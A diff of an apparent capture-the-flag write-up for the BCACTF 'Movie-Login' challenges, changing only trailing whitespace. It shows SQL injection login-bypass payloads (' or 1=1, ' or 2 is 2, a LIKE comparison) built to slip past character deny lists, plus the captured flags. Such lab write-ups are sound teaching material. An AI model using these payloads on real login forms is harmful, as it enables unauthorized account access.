@@ -52,8 +52,8 @@ Reading the statement itself we could find its SQL injection and this one is a t
 In the login page both the username and password column is vulnerable to the SQL injection.
 I used the username column to get the flag.
 						
-username:	' or 1=1 -- -;
-password:anything or leave it blank
+username:	' or 1=1 -- -;  
+password:anything or leave it blank  
 
 FLAG:bcactf{s0_y0u_f04nd_th3_fl13r?}
 
@@ -74,8 +74,8 @@ These characters were given in the denylist.json file.
  
 So this time we have to inject using different SQL statement.The payload i used was
 
-username:	' or 2 is 2 -- -; (is operator is same as =, it checks whether two values are same )
-password:
+username:	' or 2 is 2 -- -; (is operator is same as =, it checks whether two values are same )  
+password:  
 
 FLAG:bcactf{h0w_d1d_y0u_g3t_h3r3_th1s_t1m3?!?}
 
@@ -94,8 +94,8 @@ This is similar to Movie-Login 2 but we are given different deny list.
 and,1,0,true,false,/,*,=,xor,null,s,<,>
 
 
-username:	' or ‘a’ like ‘a’ -- -; ( like operator is used to compare characters or strings ‘a’ represents a character)
-password:
+username:	' or ‘a’ like ‘a’ -- -; ( like operator is used to compare characters or strings ‘a’ represents a character)  
+password:  
 
 FLAG:bcactf{gu3ss_th3r3s_n0_st0pp1ng_y0u!}
 
